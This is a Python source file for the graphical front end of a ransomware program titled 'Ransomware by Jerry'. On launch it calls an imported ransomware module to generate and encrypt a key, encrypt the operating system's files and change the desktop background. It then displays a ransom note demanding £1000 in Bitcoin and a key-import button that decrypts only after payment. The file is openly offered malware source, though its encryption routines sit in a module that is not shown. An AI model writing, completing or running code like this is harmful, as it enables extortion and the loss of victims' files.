from tkinter import font, filedialog, messagebox
from tkinter.constants import BOTTOM, END, LEFT
from typing import Sized
import ransomware
import tkinter as tk
import sys
import os
from PIL import Image, ImageTk


class Application:
    def __init__(self, master):
        self.master = master
    
        self.malware = ransomware.Ransomware()
        self.malware.create_fernet_key()
        self.malware.encrypt_fernet_key()
        self.malware.encrypt_os()
        self.malware.update_background()

        master.geometry('900x650')
        master.title('Ransomware by Jerry')
        master.configure(bg='darkred')
        self.message = '''
        YOU HAVE BEEN HACKED.
        All your files have been encrypted with the strongest technology that exists.
        If you attempt in any way to recover your files; they will be damaged and
        unrecoverable forever. The only way to recover your files are to transfer
        £1000 in Bitcoin to the provided addess: (XX-XYY-YZZZ-AA-ABB-EEE)
        Then send an email to XXX@protonmail.com with a receipt to recieve the
        decryption key in return.

        To decrypt your computer, click the button below and import the decryption-key
        recieved after payment has been made.
        '''
       
        self.load_bannerimg = Image.open('banner.png')
        self.render_bannerimg = ImageTk.PhotoImage(self.load_bannerimg)
        self.top_frame = tk.Label(master, bg='darkgrey', height=120, width=900, image=self.render_bannerimg)
        self.top_frame.pack()

        self.middle_frame = tk.Frame(master, bg='darkred', width=750)
        self.middle_frame.pack()
        self.info_label = tk.Label(self.middle_frame, text=self.message, font='ubuntu 17')
        self.info_label.pack(pady=20)
        
        self.bottom_frame = tk.Frame(master, bg='darkred')
        self.bottom_frame.pack()
        #self.bottom_lbl = tk.Label(self.bottom_frame, text='Click the button to import the decryption key after payment:', font='ubuntu 13')
        #self.bottom_lbl.pack(side=LEFT, padx=4)

        self.pixelVirtual = tk.PhotoImage(width=1, height=1)
        self.bottom_btn = tk.Button(self.bottom_frame, image=self.pixelVirtual, compound='c', text='Click to here\nto Import Key', command=self.uploadAction, height=80, width=120)
        self.bottom_btn.pack(side=LEFT, pady=15)


    def uploadAction(self, event=None):
        filename = filedialog.askopenfilename()
        if self.malware.decrypt_fernet_key(filename):
            messagebox.showinfo("Success!", "Your files have been decrypted!")
            self.malware.decrypt_os()
        else:
            messagebox.showerror("Failed!", "You have imported the wrong key.")
            

def main():
    root = tk.Tk()
    app = Application(master=root)
    root.mainloop()

if __name__ == '__main__':
    main()